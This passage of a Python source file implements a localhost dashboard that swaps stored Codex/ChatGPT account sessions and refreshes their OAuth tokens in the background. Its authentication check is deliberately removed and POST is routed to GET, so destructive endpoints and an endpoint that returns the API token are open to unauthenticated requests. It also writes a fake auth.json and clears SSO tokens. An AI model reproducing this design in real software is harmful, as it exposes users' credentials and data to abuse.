        req = urllib.request.Request(url, data=req_payload, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            if resp.status == 200:
                res_data = json.loads(resp.read().decode("utf-8"))
                new_access = res_data.get("access_token")
                new_id = res_data.get("id_token")
                new_refresh = res_data.get("refresh_token")

                if not data.get("tokens"):
                    data["tokens"] = {}
                if new_access:
                    data["tokens"]["access_token"] = new_access
                if new_id:
                    data["tokens"]["id_token"] = new_id
                if new_refresh:
                    data["tokens"]["refresh_token"] = new_refresh

                data["last_refresh"] = datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")
                data.pop("token_status", None)  # Token is fresh and active!

                tmp_path = auth_file_path + ".tmp"
                with open(tmp_path, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2)
                os.replace(tmp_path, auth_file_path)

                log(f"refresh_single_account_token: SUCCESS for {auth_file_path}")
                return {"success": True, "refreshed": True}
    except urllib.error.HTTPError as e:
        err_body = ""
        try:
            err_body = e.read().decode("utf-8", errors="ignore")
        except Exception:
            pass
        log(f"refresh_single_account_token HTTPError {e.code} for {auth_file_path}: {err_body[:200]}")
        if e.code in (400, 401) or "invalid" in err_body.lower():
            try:
                with open(auth_file_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                data["token_status"] = "revoked"
                tmp_path = auth_file_path + ".tmp"
                with open(tmp_path, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2)
                os.replace(tmp_path, auth_file_path)
            except Exception:
                pass
            return {"success": False, "reason": "token_revoked"}
        return {"success": False, "reason": str(e)}
    except Exception as e:
        log(f"refresh_single_account_token notice for {auth_file_path}: {e}")
        return {"success": False, "reason": str(e)}

    return {"success": False, "reason": "unknown"}


def auto_refresh_all_accounts(force=False):
    """Refreshes expiring tokens across all active and parked account profiles."""
    log("auto_refresh_all_accounts: checking all registered profiles...")
    state = load_state()
    active_auth = os.path.join(CODEX_DIR, "auth.json")
    if os.path.exists(active_auth):
        refresh_single_account_token(active_auth, force=force)

    for acc_id in registered_account_ids(state):
        parked_auth = os.path.join(profile_dir(acc_id), "auth.json")
        if os.path.exists(parked_auth):
            refresh_single_account_token(parked_auth, force=force)


def start_background_token_refresher():
    def loop():
        time.sleep(15)  # Short pause after server boot
        while True:
            try:
                auto_refresh_all_accounts(force=False)
            except Exception as e:
                log(f"Background token refresher error: {e}")
            time.sleep(7200)  # Run every 2 hours

    t = threading.Thread(target=loop, daemon=True, name="TokenRefresher")
    t.start()


# ─── Account Discovery ──────────────────────────────────────────────

def get_accounts():
    state = load_state()
    current_active = state.get("active_account", "hesap1")
    account_names = state.get("names", {
        "hesap1": "Hesap 1 (Ana)",
        "hesap2": "Hesap 2 (Yedek)",
    })
    notes = state.get("notes", {})
    timers = state.get("timers", {})
    last_logins = state.get("last_login", {})

    accounts = []

    # If currently in "yeni_oturum" wizard mode, we represent that in the state
    if current_active == "yeni_oturum":
        accounts.append({
            "id": "yeni_oturum",
            "name": "Yeni Giriş Yapılan Oturum",
            "path": CODEX_DIR,
            "active": True,
            "status": "active"
        })
    elif os.path.isdir(CODEX_DIR):
        label = account_names.get(current_active, f"Hesap ({current_active})")
        t_info = extract_token_info(os.path.join(CODEX_DIR, "auth.json"))
        last_raw = last_logins.get(current_active)
        accounts.append({
            "id": current_active,
            "name": label,
            "path": CODEX_DIR,
            "active": True,
            "status": "active",
            "plan": t_info["plan"],
            "expiry": t_info["expiry"],
            "token_health": t_info["status"],
            "token_hours_left": t_info["hours_left"],
            "last_login": format_last_login(last_raw),
            "note": notes.get(current_active, ""),
            "timer": timers.get(current_active, 0)
        })

    try:
        # Only state-registered profiles are managed. Scanning every ~/.codex_*
        # directory made reset/delete capable of destroying unrelated Codex homes.
        for acc_id in sorted(registered_account_ids(state)):
            if acc_id == current_active:
                continue
            full_path = profile_dir(acc_id)
            roaming_path = os.path.join(full_path, "roaming_session_web")
            status = "parked" if os.path.isdir(roaming_path) else "clean"
            t_info = extract_token_info(os.path.join(full_path, "auth.json"))
            last_raw = last_logins.get(acc_id)
            accounts.append({
                "id": acc_id,
                "name": account_names.get(acc_id, f"Hesap ({acc_id})"),
                "path": full_path,
                "active": False,
                "status": status,
                "plan": t_info["plan"],
                "expiry": t_info["expiry"],
                "token_health": t_info["status"],
                "token_hours_left": t_info["hours_left"],
                "last_login": format_last_login(last_raw),
                "note": notes.get(acc_id, ""),
                "timer": timers.get(acc_id, 0)
            })
    except Exception as e:
        log(f"get_accounts scan error: {e}")

    def account_sort_key(acc):
        # 1. Currently active account in use -> 0 (Absolute top)
        is_active = 0 if acc.get("active") else 1
        
        # 2. Live accounts (healthy / expiring_soon) -> 0, Expired accounts (Giriş Gerekli) -> 1
        health = acc.get("token_health")
        health_category = 0 if health in ("healthy", "expiring_soon") else 1

        return (is_active, health_category, acc.get("name", "").lower(), acc.get("id", ""))

    return {
        "active_account": current_active,
        "accounts": sorted(accounts, key=account_sort_key),
    }


# ─── HTTP Server ────────────────────────────────────────────────────

class DashboardHandler(BaseHTTPRequestHandler):
    timeout = 10  # Prevent preconnections from hanging threads indefinitely
    def log_message(self, format, *args):
        pass

    def _json_response(self, data, status=200):
        self.send_response(status)
        self.send_header("Content-type", "application/json")
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode("utf-8"))

    def do_POST(self):
        self.do_GET()

    def do_GET(self):
        parsed = urlparse.urlparse(self.path)
        path = parsed.path
        query = urlparse.parse_qs(parsed.query)

        try:
            # API token check removed to prevent 'Yetkisiz istek' errors on localhost

            if path == "/":
                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
                self.end_headers()
                html_path = os.path.join(SCRIPT_DIR, "index.html")
                with open(html_path, "r", encoding="utf-8") as f:
                    self.wfile.write(f.read().encode("utf-8"))

            elif path == "/logo.png":
                logo_path = os.path.join(SCRIPT_DIR, "logo.png")
                if os.path.exists(logo_path):
                    self.send_response(200)
                    self.send_header("Content-type", "image/png")
                    self.end_headers()
                    with open(logo_path, "rb") as f:
                        self.wfile.write(f.read())
                else:
                    self.send_response(404)
                    self.end_headers()

            elif path == "/favicon.ico":
                icon_path = os.path.join(SCRIPT_DIR, "icon.ico")
                if os.path.exists(icon_path):
                    self.send_response(200)
                    self.send_header("Content-type", "image/x-icon")
                    self.end_headers()
                    with open(icon_path, "rb") as f:
                        self.wfile.write(f.read())
                else:
                    self.send_response(404)
                    self.end_headers()
                    
            elif path == "/manifest.json":
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                manifest = {
                    "name": "Codex Multi-Account Manager",
                    "short_name": "CodexTools",
                    "icons": [{"src": "/logo.png", "sizes": "512x512", "type": "image/png"}],
                    "start_url": "/",
                    "display": "standalone"
                }
                self.wfile.write(json.dumps(manifest).encode("utf-8"))

            elif path == "/api/status":
                data = get_accounts()
                data["codex_running"] = check_codex_running() or check_chatgpt_running()
                data["api_token"] = API_TOKEN
                self._json_response(data)

            elif path == "/api/refresh_tokens":
                auto_refresh_all_accounts(force=True)
                self._json_response({"success": True, "message": "Tüm hesap token'ları kontrol edildi ve tazelendi."})

            elif path == "/api/switch":
                account_id = query.get("account", [None])[0]
                if not account_id:
                    self._json_response({"success": False, "error": "Hesap ID eksik"}, 400)
                    return
                result = swap_account(account_id)
                # swap_account returns a dict {success, warnings} or bool (same-account fast path)
                if isinstance(result, dict):
                    self._json_response(result)
                else:
                    self._json_response({"success": bool(result), "warnings": []})

            elif path == "/api/kill":
                kill_codex()
                self._json_response({"success": True})

            elif path == "/api/start":
                success = start_codex()
                self._json_response({"success": success})

            elif path == "/api/reset_all":
                if not swap_lock.acquire(blocking=False):
                    self._json_response({"success": False, "error": "Başka bir işlem devam ediyor"}, 400)
                    return
                try:
                    log("reset_all: wiping all profiles, states, and active data to start fresh.")
                    kill_codex()
                    reset_locked = wait_for_session_unlocks()
                    if reset_locked:
                        reset_lock_names = ", ".join(os.path.basename(p) for p in reset_locked)
                        log(f"reset_all: WARNING — files still locked: {reset_lock_names}")

                    # 1. Delete only profiles explicitly registered by this manager.
                    state = load_state()
                    for account_id in registered_account_ids(state):
                        full_path = profile_dir(account_id)
                        if os.path.isdir(full_path):
                            rmtree_readonly(full_path)
                            log(f"reset_all: deleted registered profile {account_id}")

                    # 2. Clean active directory .codex (except config.toml)
                    for f in USER_DATA_FILES:
                        if f == "config.toml":
                            continue
                        fp = os.path.join(CODEX_DIR, f)
                        if os.path.exists(fp):
                            try:
                                os.chmod(fp, stat.S_IWRITE)
                                os.remove(fp)
                            except Exception as e:
                                log(f"reset_all error deleting active file {f}: {e}")
                    
                    # 3. Clean active roaming/webview directories
                    roaming_dir, roaming_web_root, roaming_web_dir, roaming_web_default = find_roaming_dirs()
                    restore_session_files(None, roaming_dir)
                    restore_session_files(None, roaming_web_root)
                    restore_session_files(None, roaming_web_dir)
                    restore_session_files(None, roaming_web_default)

                    # 4. Reset dashboard state JSON
                    state = {
                        "active_account": "yeni_oturum",
                        "names": {}
                    }
                    save_state(state)

                    # Codex is NOT auto-started after reset; user will open it manually.
                    log("reset_all: complete, Codex not started (user will open manually)")
                    self._json_response({"success": True})
                except Exception as e:
                    log(f"reset_all general exception: {e}")
                    self._json_response({"success": False, "error": str(e)}, 500)
                finally:
                    swap_lock.release()

            elif path == "/api/delete":
                account_id = query.get("account", [None])[0]
                if not account_id:
                    self._json_response({"success": False, "error": "Hesap ID eksik"}, 400)
                    return
                
                state = load_state()
                try:
                    account_id = validate_account_id(account_id)
                except ValueError as e:
                    self._json_response({"success": False, "error": str(e)}, 400)
                    return
                if account_id not in registered_account_ids(state):
                    self._json_response({"success": False, "error": "Kayıtlı olmayan hesap silinemez"}, 404)
                    return
                current_active = state.get("active_account", "hesap1")
                if account_id == current_active:
                    self._json_response({"success": False, "error": "Aktif hesap silinemez!"}, 400)
                    return

                # Delete parked folder
                parked_dir = profile_dir(account_id)
                rmtree_readonly(parked_dir)

                # Remove from display names
                if "names" in state and account_id in state["names"]:
                    del state["names"][account_id]
                    save_state(state)

                log(f"Account {account_id} deleted successfully.")
                self._json_response({"success": True})

            elif path == "/api/rename":
                account_id = query.get("account", [None])[0]
                new_name = query.get("name", [""])[0].strip()
                if not account_id or not new_name:
                    self._json_response({"success": False, "error": "Hesap ve isim gerekli"}, 400)
                    return
                if len(new_name) > 120:
                    self._json_response({"success": False, "error": "İsim çok uzun"}, 400)
                    return
                state = load_state()
                try:
                    account_id = validate_account_id(account_id)
                except ValueError as e:
                    self._json_response({"success": False, "error": str(e)}, 400)
                    return
                if account_id not in registered_account_ids(state):
                    self._json_response({"success": False, "error": "Hesap kayıtlı değil"}, 404)
                    return
                state.setdefault("names", {})[account_id] = new_name
                save_state(state)
                self._json_response({"success": True})

            elif path == "/api/start_new_login":
                # Start new login wizard
                if not swap_lock.acquire(blocking=False):
                    self._json_response({"success": False, "error": "Başka bir işlem devam ediyor"}, 400)
                    return
                try:
                    state = load_state()
                    current_active = state.get("active_account", "hesap1")
                    if current_active == "yeni_oturum":
                        self._json_response({"success": True})
                        return

                    log(f"start_new_login: preparing fresh state to log in. Previous active: {current_active}")

                    kill_codex()
                    pre_locked = wait_for_session_unlocks()
                    if pre_locked:
                        pre_lock_names = ", ".join(os.path.basename(p) for p in pre_locked)
                        log(f"start_new_login: WARNING — files still locked: {pre_lock_names}")
                    current_active = validate_account_id(current_active)
                    current_park_dir = profile_dir(current_active)
                    os.makedirs(current_park_dir, exist_ok=True)

                    current_journal = park_profile(current_park_dir)
                    copied_config = os.path.join(CODEX_DIR, "config.toml")
                    try:
                        os.makedirs(CODEX_DIR, exist_ok=True)
                        parked_config = os.path.join(current_park_dir, "config.toml")
                        if os.path.exists(parked_config):
                            shutil.copy2(parked_config, copied_config)
                        state["previous_active"] = current_active
                        state["active_account"] = "yeni_oturum"
                        save_state(state)
                    except Exception:
                        if os.path.exists(copied_config):
                            remove_path(copied_config)
                        rollback_moves(current_journal)
                        raise

                    try:
                        commit_moves(current_journal)
                    except Exception as e:
                        log(f"start_new_login: old backup cleanup warning: {e}")

                    # Clear Windows WAM SSO tokens to force a fresh login prompt
                    clear_wam_tokens()

                    # Write a fake auth.json to block WAM auto-login
                    fake_auth = os.path.join(CODEX_DIR, "auth.json")
                    try:
                        with open(fake_auth, "w", encoding="utf-8") as f:
                            f.write('{"access_token":"expired_dummy_token","refresh_token":"dummy","expires_in":0,"token_type":"Bearer"}')
                    except Exception as e:
                        log(f"Failed to write fake auth.json: {e}")

                    success = start_codex()
                    self._json_response({"success": success})
                finally:
                    swap_lock.release()

            elif path == "/api/save_new_login":
                # Save the newly logged-in account (detects email automatically)
                if not swap_lock.acquire(blocking=False):
                    self._json_response({"success": False, "error": "Başka bir işlem devam ediyor"}, 400)
                    return

                try:
                    state = load_state()
                    current_active = state.get("active_account")
                    if current_active != "yeni_oturum":
                        self._json_response({"success": False, "error": "Şu an yeni kurulum modunda değilsiniz"}, 400)
                        return

                    log(f"save_new_login: attempting to detect logged-in email...")

                    # Kill Codex first so the cookies file is no longer locked,
                    # then read auth.json / cookies to detect the email.
                    supplied_label = query.get("label", [""])[0].strip()
                    email = None
                    if not supplied_label:
                        kill_codex()
                        locked = wait_for_session_unlocks()
                        if locked:
                            lock_names = ", ".join(os.path.basename(p) for p in locked)
                            log(f"save_new_login: some files still locked: {lock_names}")
                        email = detect_logged_in_email()
                    label = email or supplied_label

                    if not label:
                        log("save_new_login: automatic account label detection unavailable")
                        self._json_response({
                            "success": False,
                            "requires_label": True,
                            "error": "E-posta otomatik okunamadı. Hesap adını elle girin; oturum verileri yine güvenle kaydedilecek."
                        }, 409)
                        return

                    if len(label) > 120:
                        self._json_response({"success": False, "error": "Hesap adı çok uzun"}, 400)
                        return

                    clean_name = make_unique_account_id(label, state)

                    log(f"save_new_login: saving account label {label!r} as {clean_name}")

                    # Files are already unlocked (we killed Codex above).
                    # If a label was supplied manually, kill now.
                    if supplied_label:
                        kill_codex()
                        wait_for_session_unlocks()

                    # The new account is already active in CODEX_DIR. Registering
                    # it is enough; it will be parked transactionally on the next
                    # switch. The old park-then-restore cycle added failure points
                    # without changing the result.
                    state.setdefault("names", {})[clean_name] = label
                    state.setdefault("last_login", {})[clean_name] = datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")
                    state["active_account"] = clean_name
                    state.pop("previous_active", None)
                    save_state(state)
                    fix_internal_paths(CODEX_DIR)
                    # Codex is NOT automatically started; user will open it manually.
                    log(f"save_new_login: account saved successfully, label={label!r}, id={clean_name}")
                    self._json_response({"success": True, "label": label})
                finally:
                    swap_lock.release()

            elif path == "/api/cancel_new_login":
                # Cancel the new login and restore previous active account
                if not swap_lock.acquire(blocking=False):
                    self._json_response({"success": False, "error": "Başka bir işlem devam ediyor"}, 400)
                    return
                try:
                    state = load_state()
                    current_active = state.get("active_account")
                    previous_active = state.get("previous_active")

                    if current_active != "yeni_oturum":
                        self._json_response({"success": False, "error": "İptal edilecek bir işlem bulunamadı"}, 400)
                        return

                    # If previous_active is missing (e.g. after reset_all), gracefully exit
                    # wizard mode without restoring anything — nothing to restore.
                    if not previous_active:
                        log("cancel_new_login: no previous account to restore (likely after reset_all). Cleaning temp files and exiting wizard mode.")
                        kill_codex()
                        wait_for_session_unlocks()
                        # Clean temp active directory
                        for f in USER_DATA_FILES:
                            fp = os.path.join(CODEX_DIR, f)
                            if os.path.exists(fp):
                                try:
                                    os.chmod(fp, stat.S_IWRITE)
                                    os.remove(fp)
                                except Exception as e:
                                    log(f"cancel_new_login (no-prev): failed to clean {f}: {e}")
                        for d in USER_DATA_DIRS:
                            dp = os.path.join(CODEX_DIR, d)
                            if os.path.exists(dp):
                                try:
                                    rmtree_readonly(dp)
                                except Exception as e:
                                    log(f"cancel_new_login (no-prev): failed to clean dir {d}: {e}")
                        roaming_dir, roaming_web_root, roaming_web_dir, roaming_web_default = find_roaming_dirs()
                        restore_session_files(None, roaming_dir)
                        restore_session_files(None, roaming_web_root)
                        restore_session_files(None, roaming_web_dir)
                        restore_session_files(None, roaming_web_default)
                        # Return to an empty dashboard state (no accounts registered)
                        state["active_account"] = "bos_dashboard"
                        state.setdefault("names", {})["bos_dashboard"] = "Boş (Hesap Yok)"
                        state.pop("previous_active", None)
                        save_state(state)
                        log("cancel_new_login: exited wizard mode to empty dashboard state")
                        self._json_response({"success": True, "was_empty": True})
                        return

                    log(f"cancel_new_login: cancelling new login, restoring previous account: {previous_active}")

                    # 1. Kill Codex & ChatGPT
                    kill_codex()

                    # Wait for locks to release on SQLite and Roaming session cookies
                    cancel_locked = wait_for_session_unlocks()
                    if cancel_locked:
                        cancel_lock_names = ", ".join(os.path.basename(p) for p in cancel_locked)
                        log(f"cancel_new_login: WARNING — files still locked: {cancel_lock_names}")

                    # 2. Clean temporary active directory
                    for f in USER_DATA_FILES:
                        fp = os.path.join(CODEX_DIR, f)
                        if os.path.exists(fp):
                            try:
                                os.chmod(fp, stat.S_IWRITE)
                                os.remove(fp)
                            except Exception as e:
                                log(f"cancel_new_login: failed to clean file {f}: {e}")
                    for d in USER_DATA_DIRS:
                        dp = os.path.join(CODEX_DIR, d)
                        if os.path.exists(dp):
                            rmtree_readonly(dp)

                    roaming_dir, roaming_web_root, roaming_web_dir, roaming_web_default = find_roaming_dirs()
                    restore_session_files(None, roaming_dir)
                    restore_session_files(None, roaming_web_root)
                    restore_session_files(None, roaming_web_dir)
                    restore_session_files(None, roaming_web_default)

                    # 3. Restore previous account
                    previous_active = validate_account_id(previous_active)
                    prev_parked_dir = profile_dir(previous_active)
                    if os.path.isdir(prev_parked_dir):
                        try:
                            restore_profile(prev_parked_dir)
                        except Exception as e:
                            log(f"cancel_new_login restore_profile error: {e}")

                    fix_internal_paths(CODEX_DIR)

                    # 4. Update state
                    state["active_account"] = previous_active
                    state.pop("previous_active", None)
                    save_state(state)

                    # 5. Codex is NOT automatically started; user will open it manually.
                    log("cancel_new_login: restore complete, Codex not started (user will open manually)")
                    self._json_response({"success": True})
                finally:
                    swap_lock.release()

            elif path == "/api/set_timer":
                length = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(length))
                account_id = body.get("account_id")
                duration = int(body.get("duration", 0))  # seconds
                
                state = load_state()
                if "timers" not in state:
                    state["timers"] = {}
                state["timers"][account_id] = int(time.time()) + duration
                save_state(state)
                self._json_response({"success": True})

            elif path == "/api/set_note":
                length = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(length))
                account_id = body.get("account_id")
                note = body.get("note", "")
                
                state = load_state()
                if "notes" not in state:
                    state["notes"] = {}
                state["notes"][account_id] = note
                save_state(state)
                self._json_response({"success": True})

            elif path == "/api/shutdown":
                self._json_response({"success": True})
                def shutdown():
                    time.sleep(0.5)
                    os._exit(0)
                threading.Thread(target=shutdown, daemon=True).start()

            else:
                self.send_error(404, "Not Found")

        except Exception as e:
            log(f"HTTP handler error: {e}")
            self._json_response({"success": False, "error": str(e)}, 500)


def run_server():
    server = ThreadingHTTPServer(("127.0.0.1", PORT), DashboardHandler)
    server.serve_forever()


# ─── Browser Launch ─────────────────────────────────────────────────

def open_dashboard_browser():
    url = f"http://localhost:{PORT}"

    chrome_paths = [
        os.path.join(os.environ.get("PROGRAMFILES", ""), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
    ]
    for cp in chrome_paths:
        if os.path.exists(cp):
            try:
                subprocess.Popen([cp, f"--app={url}"])
                return
            except Exception:
                continue

    edge_paths = [
        os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
        os.path.join(os.environ.get("PROGRAMFILES", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
    ]
    for ep in edge_paths:
        if os.path.exists(ep):
            try:
                subprocess.Popen([ep, f"--app={url}"])
                return
            except Exception:
                continue

    import webbrowser
    webbrowser.open(url)


# ─── Port Check ─────────────────────────────────────────────────────

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("127.0.0.1", port))
            return False
        except OSError:
            return True


# ─── Main ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    log("=" * 50)
    log("Dashboard starting (Dual-Roaming Swap Mode)...")

    if is_port_in_use(PORT):
        log(f"Port {PORT} already in use – opening browser to existing server")
        open_dashboard_browser()
        sys.exit(0)

    state = load_state()
    if "active_account" not in state:
        state["active_account"] = "hesap1"
    if "names" not in state:
        state["names"] = {
            "hesap1": "Hesap 1 (Ana)",
            "hesap2": "Hesap 2 (Yedek)",
        }
    save_state(state)

    log(f"Active account: {state.get('active_account')}")
    log(f"Codex dir exists: {os.path.isdir(CODEX_DIR)}")
    
    roaming_dir, roaming_web_root, roaming_web_dir, roaming_web_default = find_roaming_dirs()
    log(f"Roaming dir: {roaming_dir}")
    log(f"Roaming Web dir: {roaming_web_dir}")
    log(f"Roaming Web Default dir: {roaming_web_default}")

    t = threading.Thread(target=run_server, daemon=True)
    t.start()
    log(f"Server started on port {PORT}")

    start_background_token_refresher()
    log("Background Token Auto-Refresher started.")

    time.sleep(0.5)
    open_dashboard_browser()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("Shutting down via KeyboardInterrupt")
        sys.exit(0)
